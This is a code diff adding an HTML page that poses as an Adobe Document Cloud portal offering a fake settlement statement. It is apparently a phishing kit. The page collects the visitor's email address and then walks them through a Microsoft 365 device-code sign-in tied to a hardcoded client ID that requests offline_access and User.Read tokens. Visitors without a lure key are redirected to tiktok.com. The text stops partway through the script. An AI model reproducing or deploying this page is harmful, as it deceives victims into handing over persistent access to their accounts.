@@ -1,0 +1,1786 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Document Cloud - Secure Portal</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --adobe-red: #FA0F00;
+            --adobe-dark-red: #D10000;
+            --primary-blue: #1473E6;
+            --dark-blue: #0D66D0;
+            --success-green: #16C79A;
+            --text-primary: #1A1A1A;
+            --text-secondary: #666666;
+            --text-tertiary: #999999;
+            --border-color: #E8E8E8;
+            --bg-light: #F8F9FA;
+            --bg-white: #FFFFFF;
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
+            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.08);
+            --shadow-lg: 0 12px 32px rgba(0, 0, 0, 0.12);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #FAFBFC;
+            min-height: 100vh;
+            color: var(--text-primary);
+            padding: 0;
+            position: relative;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Modern Header */
+        .header {
+            background: var(--bg-white);
+            border-bottom: 1px solid var(--border-color);
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            background: rgba(255, 255, 255, 0.95);
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-mark {
+            width: 36px;
+            height: 36px;
+            background: var(--adobe-red);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 800;
+            font-size: 20px;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .logo-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+            letter-spacing: -0.3px;
+        }
+
+        .logo-subtitle {
+            font-size: 12px;
+            color: var(--text-tertiary);
+            font-weight: 500;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .header-btn {
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: 1px solid var(--border-color);
+            background: var(--bg-white);
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .header-btn:hover {
+            background: var(--bg-light);
+            border-color: #D0D0D0;
+        }
+
+        /* Main Container */
+        .main-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 32px 80px;
+        }
+
+        /* Sender Info Card - Redesigned */
+        .sender-info-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 16px;
+            padding: 32px;
+            margin-bottom: 32px;
+            display: none;
+            position: relative;
+            overflow: hidden;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .sender-info-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 300px;
+            height: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .sender-info-card.visible {
+            display: block;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .sender-info-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .sender-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            color: white;
+            margin-bottom: 16px;
+        }
+
+        .sender-name {
+            font-size: 28px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .document-title-text {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 500;
+            line-height: 1.5;
+        }
+
+        /* Documents Card - Minimalist Design */
+        .documents-card {
+            background: var(--bg-white);
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .card-header {
+            padding: 24px 28px;
+            border-bottom: 1px solid var(--border-color);
+            background: var(--bg-light);
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            letter-spacing: -0.3px;
+        }
+
+        /* Document List - Clean Design */
+        .document-list {
+            padding: 8px;
+        }
+
+        .document-item {
+            background: var(--bg-white);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 8px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .document-item:hover {
+            border-color: var(--primary-blue);
+            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .document-item.selected {
+            border-color: var(--primary-blue);
+            background: linear-gradient(135deg, #F0F7FF 0%, #E8F2FF 100%);
+            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.15);
+        }
+
+        .document-checkbox {
+            flex-shrink: 0;
+        }
+
+        .custom-checkbox {
+            width: 22px;
+            height: 22px;
+            cursor: pointer;
+            appearance: none;
+            border: 2px solid #D0D0D0;
+            border-radius: 6px;
+            position: relative;
+            transition: all 0.2s ease;
+            background: var(--bg-white);
+        }
+
+        .custom-checkbox:checked {
+            background: var(--primary-blue);
+            border-color: var(--primary-blue);
+        }
+
+        .custom-checkbox:checked::after {
+            content: '✓';
+            position: absolute;
+            color: white;
+            font-size: 14px;
+            font-weight: 700;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .document-icon-wrapper {
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, #FFE5E5 0%, #FFD0D0 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .document-icon-wrapper svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        .document-content {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .document-name {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 6px;
+            word-break: break-word;
+            letter-spacing: -0.2px;
+        }
+
+        .document-meta {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 13px;
+            color: var(--text-tertiary);
+            font-weight: 500;
+        }
+
+        .document-size {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            flex-shrink: 0;
+        }
+
+        /* Download Section - Modern CTA */
+        .download-section {
+            padding: 24px 28px;
+            border-top: 1px solid var(--border-color);
+            background: var(--bg-light);
+        }
+
+        .download-btn {
+            width: 100%;
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 16px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.25);
+        }
+
+        .download-btn:hover:not(:disabled) {
+            background: var(--dark-blue);
+            box-shadow: 0 6px 16px rgba(20, 115, 230, 0.35);
+            transform: translateY(-1px);
+        }
+
+        .download-btn:disabled {
+            background: #E0E0E0;
+            cursor: not-allowed;
+            box-shadow: none;
+            color: var(--text-tertiary);
+        }
+
+        .download-count {
+            background: rgba(255, 255, 255, 0.25);
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(8px);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-content {
+            text-align: center;
+        }
+
+        .loading-spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #F0F0F0;
+            border-top: 4px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        /* Lightbox - Modern Modal */
+        .lightbox {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            animation: fadeIn 0.2s ease;
+        }
+
+        .lightbox.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .lightbox-content {
+            background: var(--bg-white);
+            border-radius: 20px;
+            max-width: 480px;
+            width: 100%;
+            padding: 40px;
+            position: relative;
+            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 24px 48px rgba(0, 0, 0, 0.2);
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(40px) scale(0.95);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+        }
+
+        .lightbox-close {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: var(--bg-light);
+            border: none;
+            font-size: 20px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            z-index: 10;
+        }
+
+        .lightbox-close:hover {
+            background: #E0E0E0;
+            transform: rotate(90deg);
+        }
+
+        .lightbox-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .lightbox-icon-wrapper {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, var(--primary-blue), var(--dark-blue));
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 32px;
+        }
+
+        .lightbox-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .lightbox-subtitle {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: all 0.2s ease;
+            background: var(--bg-white);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(20, 115, 230, 0.1);
+        }
+
+        .form-input.error {
+            border-color: #EF4444;
+            background: #FEF2F2;
+        }
+
+        .error-message {
+            color: #EF4444;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .error-message.show {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            background: var(--dark-blue);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.3);
+        }
+
+        .submit-btn:disabled {
+            background: #E0E0E0;
+            cursor: not-allowed;
+            color: var(--text-tertiary);
+        }
+
+        .submit-btn .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        .submit-btn.loading .spinner {
+            display: block;
+        }
+
+        .submit-btn.loading .btn-text {
+            display: none;
+        }
+
+        .provider-info {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .provider-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 18px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            animation: fadeInUp 0.3s ease;
+        }
+
+        .provider-badge.office365 {
+            background: #E8F3FF;
+            color: #0078D4;
+            border: 1px solid #B3D9FF;
+        }
+
+        .provider-badge.google {
+            background: #E8F5E9;
+            color: #34A853;
+            border: 1px solid #C8E6C9;
+        }
+
+        .provider-badge.other {
+            background: #FFF3E0;
+            color: #F57C00;
+            border: 1px solid #FFE0B2;
+        }
+
+        /* Device Code Styles */
+        .device-code-container {
+            padding: 20px 0;
+        }
+
+        .device-code-box {
+            background: linear-gradient(135deg, #E6F2FF 0%, #D0E8FF 100%);
+            border: 2px solid #0066CC;
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .device-code-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .device-code-value {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--primary-blue);
+            letter-spacing: 4px;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 16px;
+            user-select: all;
+        }
+
+        .copy-code-btn {
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+        }
+
+        .copy-code-btn:hover {
+            background: var(--dark-blue);
+            transform: translateY(-1px);
+        }
+
+        .copy-code-btn.copied {
+            background: #16C79A;
+        }
+
+        .device-code-instructions {
+            background: var(--bg-light);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .device-code-instructions p {
+            margin-bottom: 8px;
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .device-code-instructions ol {
+            margin-left: 20px;
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.8;
+        }
+
+        .device-login-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.2s ease;
+        }
+
+        .device-login-btn:hover {
+            background: var(--dark-blue);
+            transform: translateY(-1px);
+        }
+
+        .polling-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            padding: 12px;
+            background: #FFF9E6;
+            border-radius: 8px;
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+
+        .polling-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #FFD700;
+            border-top-color: #FF8C00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .btn-secondary {
+            background: #E8E8E8;
+            color: var(--text-primary);
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-secondary:hover {
+            background: #D8D8D8;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-container {
+                padding: 0 20px;
+            }
+
+            .main-container {
+                padding: 24px 20px 60px;
+            }
+
+            .sender-info-card {
+                padding: 24px;
+            }
+
+            .sender-name {
+                font-size: 22px;
+            }
+
+            .document-item {
+                padding: 16px;
+                flex-wrap: wrap;
+            }
+
+            .lightbox-content {
+                padding: 32px 24px;
+            }
+
+            .device-code-value {
+                font-size: 24px;
+                letter-spacing: 2px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Loading document information...</div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <div class="header">
+        <div class="header-container">
+            <div class="logo-container">
+                <div class="logo-mark">A</div>
+                <div class="logo-text">
+                    <div class="logo-title">Adobe Document Cloud</div>
+                    <div class="logo-subtitle">Secure Portal</div>
+                </div>
+            </div>
+            <div class="header-actions">
+                <button class="header-btn">
+                    <span>👤</span>
+                    <span>Account</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Sender Info Card -->
+        <div class="sender-info-card" id="senderInfoCard">
+            <div class="sender-info-content">
+                <div class="sender-badge">
+                    <span>📧</span>
+                    <span>Sent by</span>
+                </div>
+                <div class="sender-name" id="senderName">Loading...</div>
+                <div class="document-title-text" id="documentTitle">Loading document information...</div>
+            </div>
+        </div>
+
+        <!-- Documents Card -->
+        <div class="documents-card">
+            <div class="card-header">
+                <h2 class="card-title">
+                    <span>📄</span>
+                    <span>Your Documents</span>
+                </h2>
+            </div>
+
+            <div class="document-list" id="documentList">
+                <!-- Documents will be populated by JavaScript -->
+            </div>
+
+            <div class="download-section">
+                <button class="download-btn" id="downloadBtn" disabled onclick="openLightbox()">
+                    <span>⬇</span>
+                    <span id="downloadBtnText">Select documents to download</span>
+                    <span class="download-count" id="downloadCount" style="display: none;">0</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lightbox -->
+    <div class="lightbox" id="lightbox" onclick="handleLightboxClick(event)">
+        <div class="lightbox-content" onclick="event.stopPropagation()">
+            <button class="lightbox-close" onclick="closeLightbox()">×</button>
+
+            <!-- EMAIL INPUT FORM -->
+            <div id="authForm">
+                <div class="lightbox-header">
+                    <div class="lightbox-icon-wrapper">🔐</div>
+                    <h2 class="lightbox-title">Confidential Document Authorization</h2>
+                    <p class="lightbox-subtitle">
+                        Please input your email address to confirm you are authorized to access the document.
+                    </p>
+                </div>
+
+                <form id="emailForm" onsubmit="handleEmailSubmit(event)">
+                    <div class="form-group">
+                        <label class="form-label" for="emailInput">
+                            Email Address
+                        </label>
+                        <input 
+                            type="email" 
+                            id="emailInput" 
+                            class="form-input" 
+                            placeholder="your.name@company.com"
+                            autocomplete="email"
+                            required
+                        >
+                        <div class="error-message" id="errorMessage">
+                            <span>⚠️</span>
+                            <span>Please enter a valid email address</span>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <div class="spinner"></div>
+                        <span class="btn-text">Access Document</span>
+                    </button>
+
+                    <div class="provider-info" id="providerInfo"></div>
+                </form>
+            </div>
+
+            <!-- DEVICE CODE FORM (HIDDEN BY DEFAULT) -->
+            <div id="deviceCodeForm" style="display: none;">
+                <div class="lightbox-header">
+                    <div class="lightbox-icon-wrapper">🔷</div>
+                    <h2 class="lightbox-title">Microsoft 365 Authentication</h2>
+                    <p class="lightbox-subtitle">
+                        Sign in with your Microsoft account to access the document.
+                    </p>
+                </div>
+
+                <div class="device-code-container">
+                    <div class="device-code-box">
+                        <div class="device-code-label">Your Code:</div>
+                        <div class="device-code-value" id="deviceCodeValue">LOADING...</div>
+                        <button class="copy-code-btn" onclick="copyDeviceCode()">
+                            <span>📋</span>
+                            <span id="copyBtnText">Copy Code</span>
+                        </button>
+                    </div>
+
+                    <div class="device-code-instructions">
+                        <p><strong>To sign in:</strong></p>
+                        <ol>
+                            <li>Click "Open Microsoft Login" below</li>
+                            <li>Enter the code shown above</li>
+                            <li>Sign in with your Microsoft account</li>
+                            <li>Return to this page (it will auto-continue)</li>
+                        </ol>
+                    </div>
+
+                    <a href="" id="deviceLoginLink" class="device-login-btn" target="_blank">
+                        <span>🔗</span>
+                        <span>Open Microsoft Login</span>
+                    </a>
+
+                    <div class="polling-status" id="pollingStatus">
+                        <div class="polling-spinner"></div>
+                        <span>Waiting for authentication...</span>
+                    </div>
+
+                    <button class="btn-secondary" onclick="cancelDeviceCode()" style="margin-top: 16px; width: 100%;">
+                        Cancel
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== AZURE AD CONFIGURATION ==========
+        const AZURE_CONFIG = {
+            clientId: 'd2301a85-917a-484c-8c6b-d3273eebd8dd',  // Your Client ID from the URL
+            tenantId: 'common',
+            scope: 'openid profile email User.Read offline_access',
+            deviceCodeEndpoint: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+            tokenEndpoint: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            pollingInterval: 5000  // Check every 5 seconds
+        };
+
+        let deviceCodeData = null;
+        let pollingTimer = null;
+
+        // ========== COOKIE UTILITIES ==========
+        function setCookie(name, value, days = 365) {
+            const date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            const expires = "expires=" + date.toUTCString();
+            document.cookie = name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
+            console.log(`Cookie set: ${name} = ${value}`);
+        }
+
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const ca = document.cookie.split(';');
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) {
+                    return decodeURIComponent(c.substring(nameEQ.length, c.length));
+                }
+            }
+            return null;
+        }
+
+        // ========== FETCH DOCUMENT DATA ==========
+        async function fetchDoc(key) {
+            try {
+                const res = await fetch(`/api/storage.php?action=get&key=${encodeURIComponent(key)}`);
+                const data = await res.json();
+                
+                if (!data || !data.success || !data.data) {
+                    console.warn('⚠️ Document key not found in database');
+                    return null;
+                }
+                
+                return {
+                    title: data.data.title || 'Untitled Document',
+                    sender: data.data.sender || 'Unknown Sender',
+                    url: data.data.url || ''
+                };
+                
+            } catch (error) {
+                console.error('Error fetching document:', error);
+                return null;
+            }
+        }
+
+        // ========== INITIALIZE PAGE ==========
+        async function initializePage() {
+            const hash = window.location.hash.substring(1);
+            const key = hash || null;
+
+            if (!key) {
+                console.error('No key found in URL hash');
+                window.location.href = 'https://tiktok.com';
+                return;
+            }
+
+            console.log('Parsed key from URL hash:', key);
+
+            const authenticated = getCookie('authenticated');
+            
+            if (authenticated === 'yes') {
+                const redirectUrl = getCookie('redirect_url');
+                if (redirectUrl) {
+                    console.log('✅ User already authenticated');
+                    console.log('🔄 Redirecting to:', redirectUrl);
+                    window.location.href = redirectUrl;
+                    return;
+                } else {
+                    setCookie('authenticated', '', -1);
+                }
+            }
+
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            console.log('🔓 User not authenticated. Fetching document data...');
+            const docData = await fetchDoc(key);
+
+            document.getElementById('loadingOverlay').classList.remove('active');
+
+            if (!docData) {
+                console.error('❌ Document not found for key:', key);
+                window.location.href = 'https://tiktok.com';
+                return;
+            }
+
+            if (docData.url) {
+                setCookie('redirect_url', docData.url);
+                console.log(`📋 Cookie "redirect_url" set with URL:`, docData.url);
+            } else {
+                console.error('⚠️ No URL returned from API');
+            }
+
+            document.getElementById('senderName').textContent = docData.sender;
+            document.getElementById('documentTitle').textContent = docData.title;
+            document.getElementById('senderInfoCard').classList.add('visible');
+
+            if (documents.length > 0) {
+                documents[0].name = docData.title + '.pdf';
+                renderDocuments();
+            }
+        }
+
+        // SVG Icons
+        const SVG_ICONS = {
+            pdf: `<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="pdfGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                        <stop offset="0%" style="stop-color:#FF2116;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#C9201C;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <path fill="url(#pdfGrad)" d="M6 2h10l6 6v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z"/>
+                <path fill="#D32F2F" opacity="0.5" d="M16 2v6h6z"/>
+                <rect x="8" y="11" width="8" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
+                <rect x="8" y="13" width="6" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
+                <rect x="8" y="15" width="7" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
+            </svg>`,
+            
+            docx: `<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="wordGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                        <stop offset="0%" style="stop-color:#2B579A;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#1e4272;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <path fill="url(#wordGrad)" d="M6 2h10l6 6v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z"/>
+                <path fill="#1e4272" opacity="0.5" d="M16 2v6h6z"/>
+                <rect x="8" y="11" width="8" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
+                <rect x="8" y="13" width="6" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
+                <rect x="8" y="15" width="7" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
+            </svg>`
+        };
+
+        function getRandomRecentDate() {
+            const now = new Date();
+            const twoDaysAgo = new Date(now.getTime() - (2 * 24 * 60 * 60 * 1000));
+            const randomTime = twoDaysAgo.getTime() + Math.random() * (now.getTime() - twoDaysAgo.getTime());
+            return new Date(randomTime);
+        }
+
+        function formatTimestamp(date) {
+            const now = new Date();
+            const diff = now - date;
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor(diff / (1000 * 60));
+
+            if (minutes < 60) {
+                return `${minutes}m ago`;
+            } else if (hours < 24) {
+                return `${hours}h ago`;
+            } else {
+                const days = Math.floor(hours / 24);
+                return `${days}d ago`;
+            }
+        }
+
+        const documents = [
+            {
+                name: 'Account_Settlement_Statement.pdf',
+                size: '1.5 MB',
+                timestamp: getRandomRecentDate(),
+                type: 'PDF Document',
+                urgent: false,
+                fileType: 'pdf'
+            }
+        ];
+
+        documents.sort((a, b) => b.timestamp - a.timestamp);
+
+        let selectedDocuments = new Set();
+
+        function init() {
+            renderDocuments();
+            updateCounts();
+        }
+
+        function renderDocuments() {
+            const listEl = document.getElementById('documentList');
+            listEl.innerHTML = documents.map((doc, index) => `
+                <div class="document-item" data-index="${index}" onclick="handleDocumentClick(${index}, event)">
+                    <div class="document-checkbox" onclick="event.stopPropagation()">
+                        <input type="checkbox" class="custom-checkbox" id="doc-${index}" data-index="${index}" onchange="handleCheckboxChange(${index})">
+                    </div>
+                    <div class="document-icon-wrapper">
+                        ${SVG_ICONS[doc.fileType] || SVG_ICONS.pdf}
+                    </div>
+                    <div class="document-content">
+                        <div class="document-name">${doc.name}</div>
+                        <div class="document-meta">
+                            <div class="meta-item">
+                                <span>📄</span>
+                                <span>${doc.type}</span>
+                            </div>
+                            <div class="meta-item">
+                                <span>🕐</span>
+                                <span>${formatTimestamp(doc.timestamp)}</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="document-size">${doc.size}</div>
+                </div>
+            `).join('');
+        }
+
+        function handleDocumentClick(index, event) {
+            if (event.target.type !== 'checkbox') {
+                const checkbox = document.getElementById(`doc-${index}`);
+                checkbox.checked = !checkbox.checked;
+                handleCheckboxChange(index);
+            }
+        }
+
+        function handleCheckboxChange(index) {
+            const checkbox = document.getElementById(`doc-${index}`);
+            const item = document.querySelector(`.document-item[data-index="${index}"]`);
+
+            if (checkbox.checked) {
+                selectedDocuments.add(index);
+                item.classList.add('selected');
+            } else {
+                selectedDocuments.delete(index);
+                item.classList.remove('selected');
+            }
+
+            updateCounts();
+        }
+
+        function updateCounts() {
+            const count = selectedDocuments.size;
+            const downloadBtn = document.getElementById('downloadBtn');
+            const downloadBtnText = document.getElementById('downloadBtnText');
+            const downloadCount = document.getElementById('downloadCount');
+
+            if (count === 0) {
+                downloadBtn.disabled = true;
+                downloadBtnText.textContent = 'Select documents to download';
+                downloadCount.style.display = 'none';
+            } else {
+                downloadBtn.disabled = false;
+                downloadBtnText.textContent = `Download ${count} document${count > 1 ? 's' : ''}`;
+                downloadCount.textContent = count;
+                downloadCount.style.display = 'inline-block';
+            }
+        }
+
+        function openLightbox() {
+            document.getElementById('lightbox').classList.add('active');
+            setTimeout(() => {
+                document.getElementById('emailInput').focus();
+            }, 300);
+        }
+
+        function closeLightbox() {
+            if (pollingTimer) {
+                clearInterval(pollingTimer);
+                pollingTimer = null;
+            }
+
+            document.getElementById('lightbox').classList.remove('active');
+            
+            document.getElementById('authForm').style.display = 'block';
